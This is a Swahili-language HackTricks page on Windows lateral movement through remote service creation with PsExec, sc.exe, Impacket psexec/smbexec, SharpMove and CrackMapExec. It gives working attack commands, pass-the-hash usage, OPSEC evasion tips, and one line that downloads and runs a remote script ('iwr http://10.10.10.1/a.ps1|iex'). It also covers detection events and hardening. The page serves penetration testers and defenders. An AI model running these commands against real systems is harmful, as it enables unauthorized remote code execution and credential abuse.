# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Jinsi zinavyofanya kazi

Mbinu hizi hutumia vibaya Windows Service Control Manager (SCM) kwa mbali kupitia SMB/RPC ili kutekeleza amri kwenye host lengwa. Mtiririko wa kawaida ni:

1. Thibitisha utambulisho kwenye lengwa na ufikie share ya ADMIN$ kupitia SMB (TCP/445).
2. Nakili executable au bainisha command line ya LOLBAS ambayo service itatekeleza.
3. Unda service kwa mbali kupitia SCM (MS-SCMR kupitia \PIPE\svcctl) inayoelekeza kwenye amri au binary hiyo.
4. Anzisha service ili kutekeleza payload na, kwa hiari, kunasa stdin/stdout kupitia named pipe.
5. Simamisha service na usafishe (futa service na binary zozote zilizowekwa).

Mahitaji/vitu vya awali:
- Local Administrator kwenye lengwa (SeCreateServicePrivilege) au ruhusa za wazi za kuunda service kwenye lengwa.
- SMB (445) iweze kufikiwa na share ya ADMIN$ ipatikane; Remote Service Management iruhusiwe kupitia firewall ya host.
- UAC Remote Restrictions: kwa akaunti za ndani, uchujaji wa token unaweza kuzuia admin kupitia mtandao isipokuwa utumie akaunti ya Administrator iliyojengewa ndani au LocalAccountTokenFilterPolicy=1.
- Kerberos dhidi ya NTLM: kutumia hostname/FQDN huwezesha Kerberos; kuunganisha kwa kutumia IP mara nyingi hurudi kwenye NTLM (na huenda ikazuiwa katika mazingira yaliyoimarishwa usalama).

### ScExec/WinExec ya mikono kupitia sc.exe

Ifuatayo inaonyesha mbinu ya msingi ya kuunda service. Picha ya service inaweza kuwa EXE iliyowekwa au LOLBAS kama cmd.exe au powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Maelezo:
- Tarajia hitilafu ya timeout unapoanzisha EXE isiyo huduma; utekelezaji bado hufanyika.
- Ili kubaki rafiki zaidi kwa OPSEC, pendelea amri zisizo na faili (cmd /c, powershell -enc) au ufute vizalia vilivyoachwa.

Pata hatua za kina zaidi katika: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Zana na mifano

### Sysinternals PsExec.exe

- Zana ya kawaida ya msimamizi inayotumia SMB kuweka PSEXESVC.exe kwenye ADMIN$, kusakinisha huduma ya muda (jina chaguomsingi PSEXESVC), na kuelekeza I/O kupitia named pipes.
- Mifano ya matumizi:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Unaweza kuzindua moja kwa moja kutoka Sysinternals Live kupitia WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Huacha rekodi za matukio ya kusakinisha/kufuta huduma (jina la huduma mara nyingi huwa PSEXESVC isipokuwa -r itumike) na huunda C:\Windows\PSEXESVC.exe wakati wa utekelezaji.

### Impacket psexec.py (inafanana na PsExec)

- Hutumia huduma iliyopachikwa inayofanana na RemCom. Hudondosha binary ya muda ya huduma (mara nyingi huwa na jina lililobadilishwa nasibu) kupitia ADMIN$, huunda huduma (jina chaguomsingi mara nyingi huwa RemComSvc), na kuelekeza I/O kupitia named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Mabaki
- EXE ya muda katika C:\Windows\ (herufi nasibu 8). Jina la service ni RemComSvc kwa chaguomsingi isipokuwa libadilishwe.

### Impacket smbexec.py (SMBExec)

- Huunda service ya muda inayoanzisha cmd.exe na kutumia named pipe kwa I/O. Kwa ujumla huepuka kuweka payload kamili ya EXE; utekelezaji wa amri huwa na mwingiliano wa kiasi.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) hutekeleza mbinu kadhaa za lateral movement, ikiwemo exec inayotegemea service.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) inajumuisha urekebishaji/uundaji wa huduma ili kutekeleza amri kwa mbali.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Unaweza pia kutumia CrackMapExec kutekeleza kupitia backends tofauti (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, ugunduzi na artifacts

Artifacts za kawaida za host/network unapotumia mbinu zinazofanana na PsExec:
- Security 4624 (Logon Type 3) na 4672 (Special Privileges) kwenye target kwa akaunti ya admin iliyotumika.
- Security 5140/5145 File Share na File Share Detailed events zinazoonyesha ufikiaji wa ADMIN$ na uundaji/uandikaji wa service binaries (k.m., PSEXESVC.exe au .exe yenye herufi/namba 8 za nasibu).
- **System** 7045 kutoka Service Control Manager kwa usakinishaji wa service kwenye target: majina kama PSEXESVC, RemComSvc, au custom (`-r` / `-service-name`). Hii inathibitisha kuwa service ilisakinishwa, si kwamba image yake iliendeshwa. Linganisha timestamp na image path yake na process events au service-image prefetch entry inayolingana ikiwa inapatikana.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) kwa services.exe au service image, 3 (Network Connect), 11 (File Create) katika C:\Windows\, 17/18 (Pipe Created/Connected) kwa pipes kama \\.\pipe\psexesvc, \\.\pipe\remcom_*, au zinazofanana zenye majina ya nasibu.
- Registry artifact ya Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 kwenye host ya operator (ikiwa haijazimwa).

Mawazo ya kutafuta
- Toa alert kuhusu usakinishaji wa service ambapo ImagePath inajumuisha cmd.exe /c, powershell.exe, au maeneo ya TEMP.
- Tafuta process creations ambapo ParentImage ni C:\Windows\PSEXESVC.exe au watoto wa services.exe wanaoendeshwa kama LOCAL SYSTEM na kutekeleza shells.
- Weka alama kwa named pipes zinazoishia kwa -stdin/-stdout/-stderr au majina ya pipe yanayotambulika ya PsExec clone.

## Kutatua matatizo ya kawaida
- Access is denied (5) wakati wa kuunda services: si local admin kweli, vizuizi vya UAC vya remote kwa akaunti za local, au ulinzi wa EDR dhidi ya kuchezewa kwenye service binary path.
- The network path was not found (53) au haikuweza kuunganishwa na ADMIN$: firewall inazuia SMB/RPC au admin shares zimezimwa.
- Kerberos inashindwa lakini NTLM imezuiwa: unganisha kwa kutumia hostname/FQDN (si IP), hakikisha SPNs ziko sahihi, au tumia -k/-no-pass pamoja na tickets unapotumia Impacket.
- Service start inafikia timeout lakini payload iliendeshwa: hili linatarajiwa ikiwa si service binary halisi; hifadhi output kwenye faili au tumia smbexec kwa live I/O.

## Vidokezo vya hardening
- Windows 11 24H2 na Windows Server 2025 zinahitaji SMB signing kwa chaguo-msingi kwa miunganisho ya outbound (na Windows 11 pia kwa inbound). Hili halizuii matumizi halali ya PsExec yenye creds halali, lakini huzuia matumizi mabaya ya SMB relay isiyo na saini na huenda likaathiri vifaa visivyoungwa mkono na signing.<sup>[[2]](#references)</sup>
- Kuzuia NTLM kwa SMB client mpya (Windows 11 24H2/Server 2025) kunaweza kuzuia fallback ya NTLM wakati wa kuunganisha kwa IP au kwa servers zisizotumia Kerberos. Katika mazingira yaliyofanyiwa hardening, hili litavunja PsExec/SMBExec inayotumia NTLM; tumia Kerberos (hostname/FQDN) au sanidi exceptions ikiwa inahitajika kihalali.<sup>[[2]](#references)</sup>
- Kanuni ya ruhusa ya kiwango cha chini kabisa: punguza uanachama wa local admin, pendelea Just-in-Time/Just-Enough Admin, tekeleza LAPS, na fuatilia/toa alert kwa usakinishaji wa service wa 7045.

## Tazama pia

- Remote exec inayotegemea WMI (mara nyingi haihitaji faili):

{{#ref}}
./wmiexec.md
{{#endref}}

- Remote exec inayotegemea WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Uimarishaji wa usalama wa SMB katika Windows Server 2025 na Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Kutumia Credentials kumiliki Windows Boxes - Sehemu ya 2 (PSExec na Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Kutatua kuwashwa upya kusikotarajiwa kwa kutumia system event logs](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
